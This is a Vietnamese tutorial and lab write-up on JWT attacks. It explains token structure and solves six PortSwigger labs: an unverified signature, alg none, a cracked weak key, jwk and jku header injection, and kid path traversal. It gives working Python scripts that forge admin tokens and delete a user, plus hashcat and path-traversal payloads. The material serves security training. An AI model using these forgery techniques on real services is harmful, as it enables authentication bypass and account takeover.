# JSON web tokens (JWT) attack
## Khái niệm & Khai thác & Phòng tránh 
### Khái niệm
#### Cấu trúc của JSON Web Token:

Token-based authentication là phương thức xác thực bằng chuỗi má hóa. Một hệ thống sử dụng Token-based authentication cho phép người dùng nhập user/password (hoặc tương tự) để nhận về 1 chuỗi mã token. Mã này được sử dụng để "xác minh" quyền truy cập vào tài nguyên mà không cần phải cung cấp lại username/password nữa.
- JSON Web Token (JWT) là 1 tiêu chuẩn mở (RFC 7519) định nghĩa cách thức truyền tin an toàn giữa các thành viên bằng 1 đối tượng JSON. Thông tin này có thể được xác thực và đánh dấu tin cậy nhờ vào "chữ ký" của nó. Phần chữ ký của JWT sẽ được mã hóa lại bằng HMAC hoặc RSA
![image](https://hackmd.io/_uploads/HyZNhWgTp.png)
Như vậy, Bảo mật JWT là phuơng pháp xác thực quyền truy cập (Authentication) bằng JSON Web Token.

-  JSON Web Token bao gồm 3 phần, được ngăn cách nhau bởi dấu chấm (.):
    1. Header
    2. Payload
    3. Signature (chữ ký)
- Phần header sẽ chứa kiểu dữ liệu , và thuật toán sử dụng để mã hóa ra chuỗi JWT

```jwt!
{
    "typ": "JWT",
    "alg": "HS256"
}
```

- “typ” (type) chỉ ra rằng đối tượng là một JWT
- “alg” (algorithm) xác định thuật toán mã hóa cho chuỗi là HS256

Phần payload sẽ chứa các thông tin mình muốn đặt trong chuỗi 
- Thông tin truyền đi có thể là mô tả của 1 thực thể (ví dụ như người dùng) hoặc cũng có thể là các thông tin bổ sung thêm cho phần Header. Nhìn chung, chúng được chia làm 3 loại: **reserved**, **public** và **private** VD:
```jwt!
{
  "user_name": "admin",
  "user_id": "1513717410",
  "authorities": "ADMIN_USER",
  "jti": "474cb37f-2c9c-44e4-8f5c-1ea5e4cc4d18"
}
```
Phần chữ ký này sẽ được tạo ra bằng cách mã hóa phần header , payload kèm theo một chuỗi secret (khóa bí mật) , ví dụ:
```javascript!
data = base64urlEncode( header ) + "." + base64urlEncode( payload )
signature = Hash( data, secret );
```

Đoạn code trên sau khi mã hóa header và payload bằng thuật toán base64UrlEncode 
Sau đó mã hóa 2 chuỗi trên kèm theo secret (khóa bí mật) bằng thuật toán HS256 ta sẽ có chuỗi signature
Kết hợp 3 chuỗi lại ta sẽ có được một chuỗi JWT hoàn chỉnh
```javascript!
<base64-encoded header>.<base64-encoded payload>.<HMACSHA256(base64-encoded signature)>    
```

VD code typescript
```typescript!
/*
 * Create JWT (pseudocode) 
 */
function createToken(header:any,payload:any,secretKey:string):string {
const H=base64Encode(header);
const P=base64Encode(payload);
const S=hmac(H+"."+P,secretKey);
const JWT=`${H}.${P}.${S}`;
return JWT;
}

/*
 * Verify JWT (pseudocode) 
 * checks if payload is tempered or not
 */
function verifyToken(JWT:any,secretKey:string):boolean {

const {header,payload,originalSignature} = JWT; //decode

const H=base64Encode(header);
const P=base64Encode(payload);

const newSign=hmac(H+"."+P,secretKey);

return newSign===originalSignature;
}
```

Chuỗi JWT có cấu trúc H.P.S được Client gửi lên. Server sẽ làm tương tự như sau
- Set S1 = S
- Set S2 = HMAC(H.P) vỡi secret key của hệ thống) 
- So sánh S1 == S2 ?
Nếu S1 và S2 khớp nhau, tức là chữ ký hợp lệ, hệ thống mới tiếp decode payload và tục kiểm tra các data trong payload


![image](https://hackmd.io/_uploads/BkH2y-x66.png)


1. User thực hiện login bằng cách gửi id/password hay sử dụng các tài khoản mạng xã hội lên phía Authentication Server.
2. Authentication Server tiếp nhận các dữ liệu mà User gửi lên để phục vụ cho việc xác thực người dùng. Trong trường hợp thành công, Authentication Server sẽ tạo một JWT và trả về cho người dùng thông qua response.
3. Người dùng nhận được JWT do Authentication Server vừa mới trả về làm "chìa khóa" để thực hiện các "lệnh" tiếp theo đối với Application Server.
4. Application Server trước khi thực hiện lệnh được gọi từ phía User, sẽ verify JWT gửi lên. Nếu OK, tiếp tục thực hiện lệnh được gọi.


JWT headers bao gồm một tập hợp các tham số và giá trị được đặt trong một đối tượng JSON. Các tham số này cung cấp thông tin quan trọng về việc mã hóa và xác minh JWT, bên cạnh hai tham số quen thuộc alg (thuật toán mã hóa) và typ (kiểu), JOSE headers còn chứa các trường tham số quan trọng sau:
- **jwk (JSON Web Key)**: Được sử dụng để nhúng một đối tượng JSON biểu diễn một khóa vào trong JWT headers. jwk chứa thông tin về khóa công khai được sử dụng để xác minh chữ ký của JWT (Thông thường là một cặp khóa public/private được tạo ra từ các thuật toán mã hóa RSA, ECDSA hoặc HMAC). Ví dụ:

```javascript!
    "kid": "ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG",
    "typ": "JWT",
    "alg": "RS256",
    "jwk": {
        "kty": "RSA",
        "e": "AQAB",
        "kid": "ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG",
        "n": "yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9m"
    }
}
```
- **jku (JWK Set URL)**: Chỉ định URL chứa tập hợp các khóa công khai trong định dạng JSON Web Key (JWK), người tạo JWT có thể cung cấp một URL trỏ đến tập hợp khóa công khai được sử dụng để xác minh chữ ký của JWT, thường có đường dẫn là /.well-known/jwks.json. Việc sử dụng public key được nhúng trong jwt có thể chứa nhiều rủi ro, bởi vậy một số ứng dụng sử dụng tham số jku nhằm xác định một URL tham chiếu tới một bộ khóa công khai được đặt ở server.Tuy nhiên, việc triển khai không đúng cách có thể tạo ra lỗ hổng bảo mật nghiêm trọng. Một cuộc tấn công tham số jku trong self-signed JWTs thường xảy ra một kẻ tấn công giả mạo JWT bằng cách thay đổi giá trị của jku để trỏ đến một URL mà kẻ tấn công kiểm soát. Khi truy cập tới URL này, ứng dụng sẽ lấy và sử dụng các public keys do kẻ tấn công tạo ra.

```javascript!
{
    "alg": "RS256",
    "jku": "https://example.com/.well-known/jwks.json"
}
```
- **kid (Key ID)**: Được sử dụng để xác định một ID cho khóa công khai được sử dụng để xác minh chữ ký của JWT. Tham số kid (Key ID) được sử dụng để xác định khóa công khai (public key) hoặc khóa bí mật (private key) trong xác minh chữ ký của JWT. kid giúp định danh và tìm kiếm khóa phù hợp trong trường hợp có nhiều khóa khác nhau được sử dụng, đồng thời cho phép hệ thống dễ dàng quản lý nhiều khóa khác nhau khi cần thiết.
 
#### Self-signed JWTs
- Self-signed JWTs (JSON Web Tokens) là các JWT mà chữ ký được tạo và xác minh bằng cùng một khóa, không cần sử dụng khóa công khai của một bên thứ ba. Trong trường hợp này, người tạo JWT sẽ sử dụng một khóa bí mật riêng để ký JWT và sau đó xác minh chữ ký bằng cách sử dụng khóa bí mật đó.

Nhược điểm của JWT 
- Dữ liệu không được mã hóa đối với thuộc tính header và payload: Dữ liệu được truyền tải trong phần header và payload không được thực hiện mã hóa, giúp kẻ tấn công có thể dễ dàng đọc được nội dung.
- Không thể thu hồi token: Khi một token đã được tạo ra và sử dụng cho người dùng sẽ không thể thu hồi lại. Điều này đôi khi gây ra nguy cơ bảo mật trong trường hợp token bị đánh cắp hoặc bị lộ.

#### Tấn công JWT



![image](https://hackmd.io/_uploads/rySAQzgap.png)

Trong hầu hết các trường hợp, bất kỳ ai có quyền truy cập vào mã thông báo đều có thể dễ dàng đọc hoặc sửa đổi dữ liệu này. Do đó, tính bảo mật của bất kỳ cơ chế dựa trên JWT nào đều phụ thuộc rất nhiều vào chữ ký mật mã.

chữ ký JWT
Máy chủ phát hành mã thông báo thường tạo chữ ký bằng cách băm tiêu đề và tải trọng. Trong một số trường hợp, họ cũng mã hóa hàm băm kết quả. Dù bằng cách nào, quá trình này liên quan đến khóa ký bí mật. Cơ chế này cung cấp cách để máy chủ xác minh rằng không có dữ liệu nào trong mã thông báo bị giả mạo kể từ khi nó được phát hành:

- Vì chữ ký được lấy trực tiếp từ phần còn lại của mã thông báo nên việc thay đổi một byte của tiêu đề hoặc tải trọng sẽ dẫn đến chữ ký không khớp.

- Nếu không biết khóa ký bí mật của máy chủ thì sẽ không thể tạo chữ ký chính xác cho tiêu đề hoặc tải trọng nhất định.


## Khai thác
Tấn công JWT là các phương pháp tấn công cố gắng tìm cách xâm nhập, giả mạo, đánh cắp hoặc giải mã các JWT không được cho phép. Dưới đây là một số phương pháp tấn công JWT phổ biến:

- **JWT Signature Spoofing**: Đây là phương pháp tấn công phổ biến nhất. Kẻ tấn công sẽ thay đổi chữ ký của JWT và tạo ra một JWT mới. Khi server xác thực JWT này, nó sẽ tin rằng JWT này được tạo ra bởi người dùng hợp lệ.
- **JWT Tampering**: Thay đổi các thông tin trong JWT, chẳng hạn như giá trị của các trường iss, sub, aud,... để tạo ra một JWT mới. Khi server xác thực JWT này, nó sẽ tin rằng JWT này được tạo ra bởi người dùng hợp lệ.
- **JWT Brute-force attacks**: Cố gắng tìm ra secret key sử dụng trong phần signature bằng cách thử tất cả các khả năng có thể. Từ đó có thể sửa đổi nội dung thông tin truyền đạt nhằm giả mạo người dùng.
- **JWT Encryption Attack**: Giả mạo một JWT mới bằng cách mã hóa thông tin từ một JWT khác đã được xác thực. Khi server giải mã JWT mới, nó sẽ tin rằng JWT này được tạo ra bởi người dùng hợp lệ.
- **JWT Timing Attack**: Sử dụng thời gian phản hồi từ server để suy ra các thông tin trong JWT. Kẻ tấn công có thể sử dụng kỹ thuật này để suy ra chữ ký hoặc mã hóa của JWT và tạo ra một JWT mới.

### Phòng tránh 

- khi giải mã JWT, server nên kiểm tra các tham số trong JWT và đảm bảo rằng chúng tuân thủ các quy tắc và giới hạn đã được định nghĩa trước. Đặc biệt, không cho phép người dùng thêm tham số jku trong JWT
- Để ngăn chặn việc tấn công Injecting self-signed JWTs thông qua tham số jwk, chúng ta không nên chấp nhận public key được chỉ định bởi người dùng.


## 1. Lab: JWT authentication bypass via unverified signature

link: https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-unverified-signature

### Đề bài

![image](https://hackmd.io/_uploads/SkKzOGxpT.png)

### Phân tích 
- Phòng thí nghiệm này sử dụng cơ chế dựa trên JWT để xử lý các phiên. Do lỗi triển khai, máy chủ không xác minh chữ ký của bất kỳ JWT nào mà nó nhận được.
- mình cần sửa đổi mã thông báo phiên để có quyền truy cập vào bảng quản trị tại /admin, sau đó xóa người dùng carlos.
- mình được cấp tài khoản ```wiener:peter```

Chấp nhận chữ ký tùy ý
Thư viện JWT thường cung cấp một phương thức để xác minh mã thông báo và một phương thức khác chỉ giải mã chúng. Ví dụ: thư viện Node.js jsonwebtokencó ```verify()``` và ```decode()```.

Đôi khi, các nhà phát triển nhầm lẫn hai phương thức này và chỉ chuyển mã thông báo đến cho ```decode()``` phương thức đó. Điều này có nghĩa là ứng dụng hoàn toàn không xác minh chữ ký.

- Login với thông tin account được cung cấp, ta thấy server trả về JWT

![image](https://hackmd.io/_uploads/SkYp6MgTT.png)
 
đưa giá trị đó lên jwt.io mình được phần payload có chứa tên người dùng là wiener và thời gian expire

![image](https://hackmd.io/_uploads/BkqeJ7gTT.png)

vì phòng thí nghiệm không kiểm tra xác thực thong phần chữ ký mà chỉ dùng hàm decode() nên chúng ta có thể tấn công thay đổi giá trị trong phần payload này 

### Khai thác

Mở bằng JWT Editor của burp, và thử chính giá trị của trường sub thành admin

![image](https://hackmd.io/_uploads/Byx6ZXlTa.png)


với extension JSON Wb Token mình làm tương tự cũng được trang admin panel

![image](https://hackmd.io/_uploads/SkrBbQxa6.png)

mình sau đó thay đổi lại cookie và access đến ```/admin/delete/?username=carlos```

![image](https://hackmd.io/_uploads/r1uRGmlap.png)


và thành công solve được lab này

![image](https://hackmd.io/_uploads/rkHeQXxpa.png)

mình đã viết lại script khai thác
```python!
#!/usr/bin/python3.7
import requests
import re
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from urllib.parse import quote
import jwt
import base64


session = requests.Session()
url = 'https://0a58002804fceecf80303aa1006500c5.web-security-academy.net'

response = session.get(url + '/login')

soup = BeautifulSoup(response.text, 'html.parser')
csrf = soup.find('input', {'name': 'csrf'})['value']

data = {
    'csrf': csrf,
    'username': 'wiener',
    'password': 'peter',
}

response = session.post(
    url + '/login',
    data=data,
    verify=False,
    allow_redirects=False,
)

token =  response.headers['Set-Cookie'].split('; ')[0].split('=')[1]

payload = jwt.decode(token, options={"verify_signature":False})
print(f"Decode token: {payload}\n")

header,payload,signature = token.split(".")
decode_payload = base64.urlsafe_b64decode(payload + '=' * (-len(payload) % 4))
modified_payload = decode_payload.replace(b'wiener', b'administrator')
print(f"Modified payload : {modified_payload.decode()}\n")

modified_payload_b64 = base64.urlsafe_b64encode(modified_payload).rstrip(b'=').decode()
print(modified_payload_b64)
modified_token = f"{header}.{modified_payload_b64}.{signature}"
print(f"Modified token : {modified_token}\n")

session_data = modified_token
cookies = {
    'session' : session_data,

}

response = requests.get(
    url + '/admin/delete?username=carlos',
    cookies=cookies,
    verify=False,
)

soup = BeautifulSoup(response.text,'html.parser')
print(soup)
```

![image](https://hackmd.io/_uploads/rkC9WugTp.png)


![image](https://hackmd.io/_uploads/HkZDbux66.png)

mục đích của chúng ta đã hoàn thành và mình đã solve được lab này

![image](https://hackmd.io/_uploads/r1ONZOlpa.png)

## 2. Lab: JWT authentication bypass via flawed signature verification

link: https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-flawed-signature-verification

### Đề bài

![image](https://hackmd.io/_uploads/S1gtGula6.png)

### Phân tích 
- tương tự bài trước mình đăng nhập và được trả và 1 token

![image](https://hackmd.io/_uploads/BJrrN_lpa.png)

![image](https://hackmd.io/_uploads/SJ1_N_eaa.png)

![image](https://hackmd.io/_uploads/HkgZSulaT.png)

vào JSON editor mình thử sửa trường sub thành administrator nhưng không thành công

![image](https://hackmd.io/_uploads/r1zwSOla6.png)

để ý tiêu đề JWT chứa một algtham số. Điều này cho máy chủ biết thuật toán nào đã được sử dụng để ký mã thông báo và do đó, thuật toán nào cần sử dụng khi xác minh chữ ký.
- Trong trường hợp này, algtham số được đặt thành none, biểu thị cái gọi là "JWT không bảo mật" thì sao ?

### Khai thác
- mình đã đặt lại thuật toán về none và xóa đi phần chữ ký phía sau và vào đượcu trang admin

![image](https://hackmd.io/_uploads/BJmDUuxaa.png)


vậy chúng ta đã có thể xóa user carlos với url ```/admin/delete?username=carlos```

![image](https://hackmd.io/_uploads/SJmgvulT6.png)

mình đã viết lại script khai thác
```python!
#!/usr/bin/python3.7
import requests
import re
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from urllib.parse import quote
import jwt
import base64


session = requests.Session()
url = 'https://0a4b00b604f9701d8568f8fe00e60012.web-security-academy.net'

response = session.get(url + '/login')

soup = BeautifulSoup(response.text, 'html.parser')
csrf = soup.find('input', {'name': 'csrf'})['value']

data = {
    'csrf': csrf,
    'username': 'wiener',
    'password': 'peter',
}

response = session.post(
    url + '/login',
    data=data,
    verify=False,
    allow_redirects=False,
)

token =  response.headers['Set-Cookie'].split('; ')[0].split('=')[1]

decode_token = jwt.decode(token, options={"verify_signature":False})
print(f"Decode token: {decode_token}\n")

decode_token['sub'] = 'administrator'
print(f"Modified payload : {decode_token}\n")

modified_token = jwt.encode(decode_token, None, algorithm=None).decode()
print(f"Modified token : {modified_token}\n")

session_data = modified_token
cookies = {
    'session' : session_data,

}

response = requests.get(
    url + '/admin/delete?username=carlos',
    cookies=cookies,
    verify=False,
)

soup = BeautifulSoup(response.text,'html.parser')
print(soup)
```

![image](https://hackmd.io/_uploads/ryC_YOgpT.png)


![image](https://hackmd.io/_uploads/SyUwFdgaa.png)

mục đích của chúng ta đã hoàn thành và mình đã solve được lab này 

![image](https://hackmd.io/_uploads/S1e3Fue6T.png)

## 3. Lab: JWT authentication bypass via weak signing key

link: https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-weak-signing-key

### Đề bài

![image](https://hackmd.io/_uploads/rJ6ds_lap.png)

### Phân tích 
- Phòng thí nghiệm này sử dụng cơ chế dựa trên JWT để xử lý các phiên. Nó sử dụng một khóa bí mật cực kỳ yếu để ký và xác minh mã thông báo. Điều này có thể dễ dàng bị tấn công brute force bằng cách sử dụng danh sách từ chứa những bí mật chung .
- Một khi secret key sử dụng để sinh các token JWT xác thực bị lộ sẽ dẫn đến hậu quả nghiêm trọng, kẻ tấn công có thể tùy ý thay đổi các giá trị tham số quan trọng, từ đó mạo danh người dùng bất kỳ, nâng cấp quyền hạn tài khoản.
- chúng ta cần vào được bảng quản trị tại ```/admin```, sau đó xóa người dùng carlos.
- tương tự bài trước mình vào đăng nhập và được trả về 1 token

![image](https://hackmd.io/_uploads/BJI8bPZpT.png)

vì đề bài cho biết lab dùng secret key yếu nên mình có thể brute force khóa này bằng hashcat

### Khai thác

- Trước hết, chúng ta sử dụng  
```!
 hashcat  -h | grep "JWT"
 ```

lựa chọn kiểu hash, với token JWT giá trị của nó là 16500

![image](https://hackmd.io/_uploads/HkjKo8Zp6.png)

Tiếp theo, sử dụng option -a (--attack-mod) lựa chọn phương thức tấn công. Tìm kiếm cách tấn công Brute-force:

wordlist mình lấy ở https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list và cho vào file jwt

và jwt do server cấp mình cho vào file ```jwt_data```

![image](https://hackmd.io/_uploads/H1uFyPbTT.png)

sau đó mình được giá trị của secret key là ```secret1```

![image](https://hackmd.io/_uploads/Byhjyvb6T.png)

mình đem đi sửa lại tên người dùng là admin và thêm vào ```secret1``` để ký lại signature

![image](https://hackmd.io/_uploads/ByZ6ewZpa.png)

sau đó mình lấy token thay đổi đưa vào cookie và mình đã vào được trang quản trị 

![image](https://hackmd.io/_uploads/B1xngvb66.png)

và lúc này mình chỉ cần vào xóa carlos

![image](https://hackmd.io/_uploads/BJIJWw-pa.png)



## 4. Lab: JWT authentication bypass via jwk header injection

link: https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jwk-header-injection

### Đề bài

![image](https://hackmd.io/_uploads/r1JkltgT6.png)

### Phân tích 
- Phòng thí nghiệm này sử dụng cơ chế dựa trên JWT để xử lý các phiên. Máy chủ hỗ trợ jwktham số trong tiêu đề JWT. Điều này đôi khi được sử dụng để nhúng khóa xác minh chính xác trực tiếp vào mã thông báo. Tuy nhiên, nó không kiểm tra được liệu khóa được cung cấp có đến từ một nguồn đáng tin cậy hay không.
- mình cần truy cập vào bảng quản trị tại /admin, sau đó xóa người dùng carlos.

tương tự các bài trước mình đăng nhập và được JWT

![image](https://hackmd.io/_uploads/SJ_K-hxpT.png)


nếu ta embedded JWK vào header thì server sẽ sử dụng nó như public key để verify cookie đã sign bằng private key của mình.
### Khai thác
- Đầu tiên là sinh RSA keys
- mình dùng JWT editor extension và vào New RSA key

![image](https://hackmd.io/_uploads/ryB2Jnxpp.png)

sau đó embedded JWK với cặp khóa RSA vừa tạo vào JWT

![image](https://hackmd.io/_uploads/HkCNlhx66.png)

cùng với đó mình đổi trường sub thành administrator và thành công vào được trang quản trị 

![image](https://hackmd.io/_uploads/H1TYxnep6.png)

vậy là trang web đã dùng public key mà mình đã tự tạo và embedded vào

![image](https://hackmd.io/_uploads/S1gnHb2epp.png)


- giờ chúng ta chỉ cần vào xóa carlos thôi

![image](https://hackmd.io/_uploads/BJHxb2eT6.png)

## 5. Lab: JWT authentication bypass via jku header injection

link: https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jku-header-injection

### Đề bài

![image](https://hackmd.io/_uploads/HJFeXngT6.png)

### Phân tích 
- Phòng thí nghiệm này sử dụng cơ chế dựa trên JWT để xử lý các phiên. Máy chủ hỗ trợ jkutham số trong tiêu đề JWT. Tuy nhiên, nó không kiểm tra được liệu URL được cung cấp có thuộc về miền đáng tin cậy hay không trước khi tìm nạp khóa.

- mình cần   giả mạo JWT để cấp cho bạn quyền truy cập vào bảng quản trị tại /admin, sau đó xóa người dùng carlos. 

- Sau khi đăng nhập tài khoản, sử dụng extension JWT Editor Keys, chúng ta sẽ kiểm tra server có chấp nhận tham số jku hay không. Thực hiện thêm tham số jku trong phần Header JWT với giá trị sinh từ Collaborator client:

![image](https://hackmd.io/_uploads/rkYGd3lpp.png)

Điều này chứng tỏ ứng dụng xác thực danh tính người dùng bằng cách truy cập tới một URL chứa danh sách các public keys, kiểm tra ánh xạ qua giá trị tham số kid trong JWT. Tuy nhiên, khi tham số jku tồn tại trong JWT, giá trị URL này được ghi đè, dẫn đến ứng dụng sẽ truy cập tới jku trong JWT.

Do sự cài đặt sai sót này, chúng ta có thể tự dựng một trang web chứa danh sách các public keys, từ đó giả mạo tham số jku để ứng dụng truy cập tới trang web giả mạo đó.

![image](https://hackmd.io/_uploads/rJM-_2e6a.png)

### Khai thác
- Sử dụng JWT Editor Keys sinh một bộ khóa RSA dạng JWK.

![image](https://hackmd.io/_uploads/SyO3_2xT6.png)

sau đó mình copy để store trên web server mà mình đã được cấp 

![image](https://hackmd.io/_uploads/S14-qhl6p.png)

![image](https://hackmd.io/_uploads/ByUfc2gTp.png)

thay đổi jku thành đường dẫn của exploit server cùng với đó mình thay đổi trường kid của public key thành kid của public key mà mình vừa tạo và đổi trường sub thành administrator sau đấy mình sign với cặp key mà mình vừa tạo 
 - và mình đã vào được trang quản trị

![image](https://hackmd.io/_uploads/Hka59ne6T.png)

và lúc này mình chỉ cần xóa carlos

![image](https://hackmd.io/_uploads/BJQa52lTT.png)

## 6. Lab: JWT authentication bypass via kid header path traversal

link: https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-kid-header-path-traversal

### Đề bài

![image](https://hackmd.io/_uploads/HJSwA2eaT.png)

### Phân tích 
- lab này sử dụng cơ chế dựa trên JWT để xử lý các phiên. Để xác minh chữ ký, máy chủ sử dụng tham số kid  trong tiêu đề JWT để tìm nạp khóa liên quan từ hệ thống tệp của nó.
- kid (KEY ID) - Cung cấp ID mà máy chủ có thể sử dụng để xác định khóa chính xác trong trường hợp có nhiều khóa để chọn. Nó được sử dụng để khớp với một khóa cụ thể.

tương tự các bài trước đăng nhập và mình có JWT

![image](https://hackmd.io/_uploads/rJNdg6x66.png)

### Khai thác
- Tạo mới một Symmetric Key, với giá trị là null byte (AA== là dạng base64 encode của null byte)

![image](https://hackmd.io/_uploads/Sk1Pbpg6p.png)


Param k là ```AA==``` là key = null byte để server có thể decrypt

Sửa tham số kid thành ```../../../../../../../dev/null```

![image](https://hackmd.io/_uploads/B1wt-pgTp.png)

Khi decrypt jwt, nó sẽ đi tìm kid ở vị trí đó và check xem có file đó không, đó là lý do ta đổi thành file đó.

sau đó ta sign jwt là có thể solve lab

## Thank you for reading >.< Gud bye

![image](https://hackmd.io/_uploads/SycyQdwFp.png)


<img  src="https://3198551054-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FVvHHLY2mrxd5y4e2vVYL%2Fuploads%2FF8DJirSFlv1Un7WBmtvu%2Fcomplete.gif?alt=media&token=045fd197-4004-49f4-a8ed-ee28e197008f">

## Tham khảo 
- https://viblo.asia/p/jwt-tu-co-ban-den-chi-tiet-LzD5dXwe5jY
- https://hackmd.io/@andreaFan321/rkbCzTOas?utm_source=preview-mode&utm_medium=rec
- https://viblo.asia/p/json-web-tokens-jwt-attack-tan-cong-jwt-phan-2-MG24BKrBJz3
- https://portswigger.net/burp/documentation/desktop/testing-workflow/session-management/jwts